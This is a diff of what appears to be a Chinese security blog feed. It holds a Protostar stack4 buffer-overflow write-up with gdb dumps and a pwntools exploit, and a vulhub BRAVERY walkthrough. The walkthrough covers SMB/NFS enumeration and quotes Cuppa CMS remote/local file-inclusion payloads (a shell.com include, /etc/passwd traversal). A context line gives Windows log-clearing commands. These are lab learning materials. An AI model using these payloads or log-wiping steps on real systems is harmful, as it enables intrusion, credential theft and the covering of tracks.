+<p>9、<code>ret：</code><strong>返回，结束函数。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 9, 0x0804841e <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:16
+16      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804841e           0x804841e &lt;main+22&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+   0x8048430 &lt;__libc_csu_init&gt;: push   ebp
+   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0x1d1faa00      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a</code></pre></div>
+<p>执行完<code>ret</code>指令后，再次查看相应变化，可以见到并未执行win函数；</p>
+<div><pre class="hljs"><code>(gdb) n
+__libc_start_call_main (main=main@entry=0x8048408 &lt;main&gt;, argc=argc@entry=1, argv=argv@entry=0xffffd064)
+    at ../sysdeps/nptl/libc_start_call_main.h:74
+74      ../sysdeps/nptl/libc_start_call_main.h: No such file or directory.
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfc0          0xffffcfc0
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0xf7c237c8          0xf7c237c8 &lt;__libc_start_call_main+120&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0xf7c237c8 &lt;__libc_start_call_main+120&gt;:     sub    esp,0xc
+   0xf7c237cb &lt;__libc_start_call_main+123&gt;:     push   eax
+   0xf7c237cc &lt;__libc_start_call_main+124&gt;:     call   0xf7c3c1a0 &lt;__GI_exit&gt;
+   0xf7c237d1 &lt;__libc_start_call_main+129&gt;:     call   0xf7c84320 &lt;__GI___nptl_deallocate_tsd&gt;
+   0xf7c237d6 &lt;__libc_start_call_main+134&gt;:     mov    eax,DWORD PTR [esp]
+   0xf7c237d9 &lt;__libc_start_call_main+137&gt;:     lock sub DWORD PTR [eax+0x124],0x1
+   0xf7c237e1 &lt;__libc_start_call_main+145&gt;:     je     0xf7c237fb &lt;__libc_start_call_main+171&gt;
+   0xf7c237e3 &lt;__libc_start_call_main+147&gt;:     mov    edx,0x1
+   0xf7c237e8 &lt;__libc_start_call_main+152&gt;:     xor    ebx,ebx
+   0xf7c237ea &lt;__libc_start_call_main+154&gt;:     lea    esi,[esi+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
+0xffffd050:     0x08048420      0xf7fcecd0      0xffffd05c      0xf7ffda20
+0xffffd060:     0x00000001      0xffffd237      0x00000000      0xffffd251
+0xffffd070:     0xffffd260      0xffffd274      0xffffd297      0xffffd2cd
+0xffffd080:     0xffffd2ee      0xffffd2fb      0xffffd319      0xffffd335
+0xffffd090:     0xffffd351      0xffffd361      0xffffd372      0xffffd37c
+0xffffd0a0:     0xffffd389      0xffffd3a8      0xffffd44a      0xffffd468
+0xffffd0b0:     0xffffd483      0xffffd49a      0xffffd4ad      0xffffd4cb</code></pre></div>
+<hr />
+<p><strong>分析：</strong></p>
+<p>可以看到，在<code>call 0x804830c &lt;gets@plt&gt;</code>,程序需要我们的输入，于是我们输入输入了长度为64的‘a’,即‘a’*64;</p>
+<p>然后我们观察输入后的栈结构，如下图所示：</p>
+<p><img src="/_resources/369cc4d3ba294f94929d2281e8f0d7c8.png" /></p>
+<p>但是从最后的结果来看，长度为64并没有成功溢出跳转到win函数，所以我们继续往下看，寻找ret的返回地址，如下图：</p>
+<p><img src="/_resources/4409785612014b819afec5c62fb9f3e0.png" /></p>
+<p>从上图可以看到，即将执行的<code>ret</code>的存储的返回地址就是此刻位于栈顶的<code>0xf7c237c5</code></p>
+<p>那么，我们的目标就是：<strong>输入足够的长度，覆盖到</strong><code>0xf7c237c5</code><strong>为止</strong></p>
+<p><strong><img src="/_resources/9c3dc04410924bec86daab2e5f96a1ad.png" /></strong></p>
+<p><strong>从上图中可以很清晰的看到，我们还需要填充(3组)x(每组4字节)=（一共12字节）的长度，才能达到返回地址前，然后再用目标地址覆盖原来的返回地址</strong></p>
+<p><strong>我们的目标地址应当是win函数的地址，如下：win函数地址为<code>0x80483f4</code></strong></p>
+<div><pre class="hljs"><code>(gdb) <span class="hljs-built_in">print</span> win
+<span class="hljs-variable">$7</span> = {void (void)} 0x80483f4 &lt;win&gt;</code></pre></div>
+<p><strong>我们也可以在执行ret前做一下测试，用set命令直接修改<code>0xf7c237c5</code>为<code>0x80483f4</code>，过程如下：</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 9, 0x0804841e <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:16
+16      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804841e           0x804841e &lt;main+22&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+   0x8048430 &lt;__libc_csu_init&gt;: push   ebp
+   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
+(gdb) <span class="hljs-built_in">set</span> *0xffffcfac=0x80483f4
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0x080483f4      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
+(gdb) n
+win () at stack4/stack4.c:7
+7       <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfb0          0xffffcfb0
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x80483f4           0x80483f4 &lt;win&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x80483f4 &lt;win&gt;:     push   ebp
+   0x80483f5 &lt;win+1&gt;:   mov    ebp,esp
+   0x80483f7 &lt;win+3&gt;:   sub    esp,0x18
+   0x80483fa &lt;win+6&gt;:   mov    DWORD PTR [esp],0x80484e0
+   0x8048401 &lt;win+13&gt;:  call   0x804832c &lt;puts@plt&gt;
+   0x8048406 &lt;win+18&gt;:  leave
+   0x8048407 &lt;win+19&gt;:  ret
+   0x8048408 &lt;main&gt;:    push   ebp
+   0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+(gdb) n
+win () at stack4/stack4.c:8
+8       <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) n
+code flow successfully changed
+9       <span class="hljs-keyword">in</span> stack4/stack4.c</code></pre></div>
+<p>从上述过程中，我们可以看到，在执行ret指令前，我们将位于栈顶的返回地址 <code>0xf7c237c5</code>修改为<code>0x80483f4</code>，然后成功跳转到了win函数并输出了我们的期望目标：<code>code flow successfully changed</code></p>
+<hr />
+<p><strong>Exp如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">"./stack4"</span>)
+
+ret_addr  = <span class="hljs-number">0x80483f4</span>
+
+payload  = <span class="hljs-string">b'a'</span>*<span class="hljs-number">76</span>
+
+payload += p32(ret_addr)
+
+sh.sendline(payload)
+
+<span class="hljs-built_in">print</span>(sh.recvline())</code></pre></div>
+<p><strong>BinGo!!!</strong></p>
+<p><img src="/_resources/9a7840d59a1e46a28068c6598a58db33.png" /></p>
+<p> </p>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Protostar_stack3]]></title>
             <guid>3b4e30cf9a634675804df8b7391dd4bf</guid>
@@ -946,550 +1631,6 @@ clearev 清除windows中的应用程序日志、系统日志、安全日志
 在文件资源管理器中点击 <span class="hljs-string">"查看"</span> -&gt; <span class="hljs-string">"选项"</span> -&gt;在常规-&gt;隐私中点击<span class="hljs-string">" 清除"</span> 按钮
 或直接打开C:\Users\Administrator\Recent并删除所有内容
 或在命令行中输入del /<span class="hljs-keyword">f</span> /s /q  <span class="hljs-comment">"%userprofile%\Recent*.*</span></code></pre></div>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[vulhub    DIGITALWORLD.LOCAL: BRAVERY]]></title>
-            <guid>51671c3f6b824ed59e3b07ac6d5f7558</guid>
-            <pubDate>Sat, 22 Oct 2022 02:54:08 GMT</pubDate>
-            <content:encoded><![CDATA[<p><strong>探测靶机ip及端口开放情况</strong></p>
-<div><pre class="hljs"><code>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.15
-Host is up (0.00020s latency).
-Not shown: 990 closed tcp ports (reset)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-53/tcp   open  domain
-80/tcp   open  http
-111/tcp  open  rpcbind
-139/tcp  open  netbios-ssn
-443/tcp  open  https
-445/tcp  open  microsoft-ds
-2049/tcp open  nfs
-3306/tcp open  mysql
-8080/tcp open  http-proxy
-MAC Address: 08:00:27:B6:AC:46 (Oracle VirtualBox virtual NIC)</code></pre></div>
-<p>访问8080,扫描目录如下</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># python dirsearch.py -u http://192.168.56.15:8080/</span>
-
-  _|. _ _  _  _  _ _|_    v0.4.2.6
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342
-
-Output File: /root/dirsearch/reports/192.168.56.15_8080/__22-10-26_15-42-50.txt
-
-Target: http://192.168.56.15:8080/
-
-[15:42:50] Starting: 
-[15:42:56] 200 -    4KB - /404.html                                         
-[15:42:57] 200 -  503B  - /about                                            
-[15:43:18] 200 -    3KB - /index.html                                       
-[15:43:30] 301 -  185B  - /private  -&gt;  http://192.168.56.15:8080/private/  
-[15:43:31] 301 -  185B  - /public  -&gt;  http://192.168.56.15:8080/public/    
-[15:43:31] 200 -   22KB - /public/                                          
-[15:43:32] 200 -  103B  - /robots.txt</code></pre></div>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># python dirsearch.py -u http://192.168.56.15:8080/public</span>
-
-  _|. _ _  _  _  _ _|_    v0.4.2.6
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342
-
-Output File: /root/dirsearch/reports/192.168.56.15_8080/_public_22-10-26_15-44-17.txt
-
-Target: http://192.168.56.15:8080/public/
-
-[15:44:17] Starting: 
-[15:44:18] 301 -  185B  - /public/js  -&gt;  http://192.168.56.15:8080/public/js/
-[15:44:19] 200 -   14KB - /public/.DS_Store                                 
-[15:44:38] 301 -  185B  - /public/css  -&gt;  http://192.168.56.15:8080/public/css/
-[15:44:42] 301 -  185B  - /public/fonts  -&gt;  http://192.168.56.15:8080/public/fonts/
-[15:44:45] 301 -  185B  - /public/img  -&gt;  http://192.168.56.15:8080/public/img/
-[15:44:45] 200 -   22KB - /public/index.html                                
-[15:44:47] 403 -  571B  - /public/js/                                       
-[15:44:50] 200 -  766B  - /public/mail.php</code></pre></div>
-<p>访问各个web目录,如下</p>
-<p><img src="/_resources/dbfdd8360a7f456daf0a7f73398a1dfe.png" alt="9287f5ad2764d3e4972692cb1ec023de.png" width="885" height="528" class="jop-noMdConv" /> <img src="/_resources/49a73b58d1a6452c9b35e396ca460e85.png" alt="53e64311e9988394fe99f638c42aef1c.png" width="867" height="395" class="jop-noMdConv" /><img src="/_resources/0f1e377f7d014357b36712813edcc7c0.png" alt="bb7d7fb95ebc0adc10689b4abed38a25.png" width="797" height="439" class="jop-noMdConv" /></p>
-<p>没有发现有价值的信息</p>
-<hr />
-<p>发现开放了445端口，尝试访问得到如下</p>
-<p>发现anonymous 可以访问，secured无法访问</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbmap  -H 192.168.56.15</span>
-[+] Guest session       IP: 192.168.56.15:445   Name: 192.168.56.15                                     
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        anonymous                                               READ ONLY
-        secured                                                 NO ACCESS
-        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.7.1)</code></pre></div>
-<p>继续访问anonymous 文件夹下数据，得到</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbclient //192.168.56.15/anonymous</span>
-Password <span class="hljs-keyword">for</span> [WORKGROUP\root]:
-Try <span class="hljs-string">"help"</span> to get a list of possible commands.
-smb: \&gt; dir
-  .                                   D        0  Fri Sep 28 21:01:35 2018
-  ..                                  D        0  Fri Jun 15 00:30:39 2018
-  patrick<span class="hljs-string">'s folder                    D        0  Fri Sep 28 20:38:27 2018
-  qiu'</span>s folder                        D        0  Fri Sep 28 21:27:20 2018
-  genevieve<span class="hljs-string">'s folder                  D        0  Fri Sep 28 21:08:31 2018
-  david'</span>s folder                      D        0  Wed Dec 26 10:19:51 2018
-  kenny<span class="hljs-string">'s folder                      D        0  Fri Sep 28 20:52:49 2018
-  qinyi'</span>s folder                      D        0  Fri Sep 28 20:45:22 2018
-  sara<span class="hljs-string">'s folder                       D        0  Fri Sep 28 21:34:23 2018
-  readme.txt                          N      489  Fri Sep 28 21:54:03 2018
-
-                17811456 blocks of size 1024. 13171116 blocks available
-smb: \&gt;</span></code></pre></div>
-<p>查看该目录下的内容，木有什么有价值的</p>
-<hr />
-<p>还发现了nfs服务，查看发现存在nfs目录，将其挂载到本地</p>
-<div><pre class="hljs"><code>┌──(root㉿kali)-[~/dirsearch]
-└─<span class="hljs-comment"># showmount -e 192.168.56.15                            </span>
-Export list <span class="hljs-keyword">for</span> 192.168.56.15:
-/var/nfsshare *
-                                                                                                                           
-┌──(root㉿kali)-[~/dirsearch]
-└─<span class="hljs-comment"># mount -t nfs 192.168.56.15:/var/nfsshare  /mnt/bravery</span>
-                                                                                                                           
-┌──(root㉿kali)-[~/dirsearch]
-└─<span class="hljs-comment"># cd /mnt/bravery </span>
-                                                                                                                           
-┌──(root㉿kali)-[/mnt/bravery]
-└─<span class="hljs-comment"># ls</span>
-discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt</code></pre></div>
-<p>查看nfs目录下的文件</p>
-<div><pre class="hljs"><code>┌──(root㉿kali)-[/mnt/bravery]
-└─<span class="hljs-comment"># ls              </span>
-discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt
-                                                                                                                           
-┌──(root㉿kali)-[/mnt/bravery]
-└─<span class="hljs-comment"># cat password.txt</span>
-Passwords should not be stored <span class="hljs-keyword">in</span> clear-text, written <span class="hljs-keyword">in</span> post-its or written on files on the hard disk!
-                                                                                                                           
-┌──(root㉿kali)-[/mnt/bravery]
-└─<span class="hljs-comment"># cat README.txt  </span>
-<span class="hljs-built_in">read</span> me first!</code></pre></div>
-<p><code>qwertyuioplkjhgfdsazxcvbnm</code>应当是一个密码</p>
-<p>想到之前samba共享的secured目录需要登录，尝试使用刚获取的密码</p>
-<p>账户猜测是anonymous 文件夹下的 xxx’s folder的名字，成功登录secured目录</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbclient -U david //192.168.56.15/secured</span>
-Password <span class="hljs-keyword">for</span> [WORKGROUP\david]:
-Try <span class="hljs-string">"help"</span> to get a list of possible commands.
-smb: \&gt; dir
-  .                                   D        0  Fri Sep 28 21:52:14 2018
-  ..                                  D        0  Fri Jun 15 00:30:39 2018
-  david.txt                           N      376  Sat Jun 16 16:36:07 2018
-  genevieve.txt                       N      398  Tue Jul 24 00:51:27 2018
-  README.txt                          N      323  Tue Jul 24 09:58:53 2018
-
-                17811456 blocks of size 1024. 13181944 blocks available
-smb: \&gt; get david.txt
-getting file \david.txt of size 376 as david.txt (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)
-smb: \&gt; get genevieve.txt 
-getting file \genevieve.txt of size 398 as genevieve.txt (9.0 KiloBytes/sec) (average 8.5 KiloBytes/sec)
-smb: \&gt; get README.txt 
-getting file \README.txt of size 323 as README.txt (21.0 KiloBytes/sec) (average 10.3 KiloBytes/sec)</code></pre></div>
-<p>查看三个文件的信息</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># cat david.txt </span>
-I have concerns over how the developers are designing their webpage. The use of <span class="hljs-string">"developmentsecretpage"</span> is too long and unwieldy. We should cut short the addresses <span class="hljs-keyword">in</span> our <span class="hljs-built_in">local</span> domain.
-
-1. Reminder to tell Patrick to replace <span class="hljs-string">"developmentsecretpage"</span> with <span class="hljs-string">"devops"</span>.
-
-2. Request the intern to adjust her Favourites to http://&lt;developmentIPandport&gt;/devops/directortestpagev1.php.
-                                                                                                                           
-┌──(root㉿kali)-[~]
-└─<span class="hljs-comment"># cat genevieve.txt </span>
-Hi! This is Genevieve!
-
-We are still trying to construct our department<span class="hljs-string">'s IT infrastructure; it'</span>s been proving painful so far.
-
-If you wouldn<span class="hljs-string">'t mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We'</span>re trying to establish quite a few things:
-
-a) File-share to our director.
-b) Setting up our CMS.
-c) Requesting <span class="hljs-keyword">for</span> a HIDS solution to secure our host.
-                                                                                                                           
-┌──(root㉿kali)-[~]
-└─<span class="hljs-comment"># cat README.txt </span>
-README FOR THE USE OF THE BRAVERY MACHINE:
-
-Your use of the BRAVERY machine is subject to the following conditions:
-
-1. You are a permanent staff <span class="hljs-keyword">in</span> Good Tech Inc.
-2. Your rank is HEAD and above.
-3. You have obtained your BRAVERY badges.
-
-For more enquiries, please <span class="hljs-built_in">log</span> into the CMS using the correct magic word: goodtech.</code></pre></div>
-<p>访问http://192.168.56.15/devops/directortestpagev1.php</p>
-<img src="/_resources/5b48a2241eac4a26a15f140e6334681a.png" alt="54a44f54c9ff21fd31d3746ac89840cb.png" width="992" height="212" class="jop-noMdConv" />
-<p>访问http://192.168.254.155/genevieve --&gt;  <a title="http://192.168.56.15/genevieve" href="http://192.168.56.15/genevieve">http://192.168.56.15/genevieve</a></p>
-<img src="/_resources/e13d738f90d94dffb9aecd0fa3d57c3c.png" alt="6850429da6ab493a6643ded72e2e568a.png" width="971" height="655" class="jop-noMdConv" />
-<p>继续访问该站点，发现该站点为cuppaCMS</p>
-<img src="/_resources/b9e35dcee43342559da22b647ed55277.png" alt="9d345ebc9c20af949ef665a458c90767.png" width="934" height="439" class="jop-noMdConv" />
-<hr />
-<p>搜索cuppaCMS相关的漏洞</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># searchsploit cuppa   </span>
---------------------------------------------------------------- ---------------------------------
- Exploit Title                                                 |  Path
---------------------------------------------------------------- ---------------------------------
-Cuppa CMS - <span class="hljs-string">'/alertConfigField.php'</span> Local/Remote File Inclusio | php/webapps/25971.txt
---------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results</code></pre></div>
-<p>查看漏洞详情并尝试利用</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># searchsploit -p 25971.txt</span>
-  Exploit: Cuppa CMS - <span class="hljs-string">'/alertConfigField.php'</span> Local/Remote File Inclusion
-      URL: https://www.exploit-db.com/exploits/25971
-     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
-File Type: C++ <span class="hljs-built_in">source</span>, ASCII text, with very long lines (876)</code></pre></div>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span>
-<span class="hljs-comment"># Exploit Title   : Cuppa CMS File Inclusion</span>
-<span class="hljs-comment"># Date            : 4 June 2013</span>
-<span class="hljs-comment"># Exploit Author  : CWH Underground</span>
-<span class="hljs-comment"># Site            : www.2600.in.th</span>
-<span class="hljs-comment"># Vendor Homepage : http://www.cuppacms.com/</span>
-<span class="hljs-comment"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span>
-<span class="hljs-comment"># Version         : Beta</span>
-<span class="hljs-comment"># Tested on       : Window and Linux</span>
-
-  ,--^----------,--------,-----,-------^--,
-  | |||||||||   `--------<span class="hljs-string">'     |          O .. CWH Underground Hacking Team ..
-  `+---------------------------^----------|
-    `\_,-------, _________________________|
-      / XXXXXX /`|     /
-     / XXXXXX /  `\   /
-    / XXXXXX /\______(
-   / XXXXXX /
-  / XXXXXX /
- (________(
-  `------'</span>
-
-<span class="hljs-comment">####################################</span>
-VULNERABILITY: PHP CODE INJECTION
-<span class="hljs-comment">####################################</span>
-
-/alerts/alertConfigField.php (LINE: 22)
-
------------------------------------------------------------------------------
-LINE 22:
-        &lt;?php include(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"urlConfig"</span>]); ?&gt;
------------------------------------------------------------------------------
-
-
-<span class="hljs-comment">#####################################################</span>
-DESCRIPTION
-<span class="hljs-comment">#####################################################</span>
-
-An attacker might include <span class="hljs-built_in">local</span> or remote PHP files or <span class="hljs-built_in">read</span> non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code <span class="hljs-keyword">in</span> this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
-
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
-
-<span class="hljs-comment">#####################################################</span>
-EXPLOIT
-<span class="hljs-comment">#####################################################</span>
-
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-
-Moreover, We could access Configuration.php <span class="hljs-built_in">source</span> code via PHPStream
-
-For Example:
------------------------------------------------------------------------------
-http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
------------------------------------------------------------------------------
-
-Base64 Encode Output:
------------------------------------------------------------------------------
